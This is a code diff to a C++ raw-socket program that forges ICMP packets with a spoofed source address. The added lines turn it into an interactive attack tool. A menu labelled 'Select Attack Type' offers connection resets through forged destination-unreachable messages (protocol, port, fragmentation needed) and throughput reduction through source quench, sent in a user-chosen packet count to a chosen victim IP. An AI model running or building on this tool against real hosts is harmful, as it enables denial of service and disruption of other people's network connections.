@@ -6,7 +6,7 @@
 
 using namespace std;
 
-#define ui unsigned int
+#define ui unsigned long long
 
 struct param{
     ui val;
@@ -171,45 +171,11 @@ void sendPacket(ICMP_Packet &icmp , char * buff){
     dest_info.sin_family = AF_INET;
     dest_info.sin_addr.s_addr = addrs;
 
-
-    cout << ntohs((unsigned short)icmp.total_len.val) << "\n";
-    cout << dest_info.sin_addr.s_addr << "\n";
-
     sendto(sock, buff, (unsigned short)icmp.total_len.val, 0, 
         (struct sockaddr *) &dest_info, sizeof(dest_info));
-    cout << "Sent\n";
 
     close(sock);
 
-}
-
-
-void doSum(){
-    ICMP_Packet icmp;
-    int length = 1000;
-    char * buff = new char[length]; 
-
-    icmp.type.val = 3;
-    icmp.code.val = 1;
-    icmp.icmp_checksum.val = 0;
-
-    icmp.version.val = 4;
-    icmp.header_len.val = 5;
-    icmp.ttl.val = 20;
-    icmp.source_addr.val = strToIp("192.168.0.103");
-    icmp.dest_addr.val = strToIp("192.168.0.101");
-    icmp.protocol.val = 1;
-    icmp.construct_packet(buff, length);
-
-    for(int i = 0; i < 1; i++)
-        sendPacket(icmp, buff);
-
-    cout << icmp.total_len.val << "==========\n";
-    for(int i = 0; i < icmp.total_len.val; i++){
-        cout << (unsigned int)buff[i] << " ";
-    }
-
-    cout << "Hello world\n";
 }
 
 
@@ -218,25 +184,55 @@ int main(){
     int length = 1000;
     char * buff = new char[length]; 
 
-    icmp.type.val = 3;
-    icmp.code.val = 1;
+    icmp.type.val = 4;
+    icmp.code.val = 0;
     icmp.icmp_checksum.val = 0;
 
     icmp.version.val = 4;
     icmp.header_len.val = 5;
     icmp.ttl.val = 20;
     icmp.source_addr.val = strToIp("192.168.0.103");
-    icmp.dest_addr.val = strToIp("192.168.0.101");
+    icmp.dest_addr.val = strToIp("192.168.0.106");
     icmp.protocol.val = 1;
+
+
+    string sIp , dIp;
+    cout << "Source IP: ";
+    cin >> sIp;
+    cout << "Destination IP: ";
+    cin >> dIp;
+    icmp.source_addr.val = strToIp(sIp);
+    icmp.dest_addr.val = strToIp(dIp);    
+
+    cout << "Select Attack Type: \n";
+    cout << "1. Connection Reset(Protocol Unreachable)\n";
+    cout << "2. Connection Reset(Port Unreachable)\n";
+    cout << "3. Connection Reset(Fragmentation needed)\n";
+    cout << "4. Reduce throughput(Source quench)\n";
+    int input, packetCount = 1;
+    cin >> input;
+    if(input == 1){
+        icmp.type.val = 3;
+        icmp.code.val = 2;
+    }else if(input == 2){
+        icmp.type.val = 3;
+        icmp.code.val = 3;
+    }else if(input == 3){
+        icmp.type.val = 3;
+        icmp.code.val = 4;        
+    }else{
+        icmp.type.val = 4;
+        icmp.code.val = 0;
+    }
+    cout << "Packet count: ";
+    cin >> packetCount;
+
     icmp.construct_packet(buff, length);    
 
-    for(int i = 0; i < 1; i++)
+
+    for(int i = 0; i < packetCount; i++)
         sendPacket(icmp, buff);
 
-    cout << icmp.total_len.val << "==========\n";
-    for(int i = 0; i < icmp.total_len.val; i++){
-        cout << (unsigned int)buff[i] << " ";
-    }
+    cout << packetCount << " packets sent to " << dIp << "\n";
 
-    cout << "Hello world\n";
 }
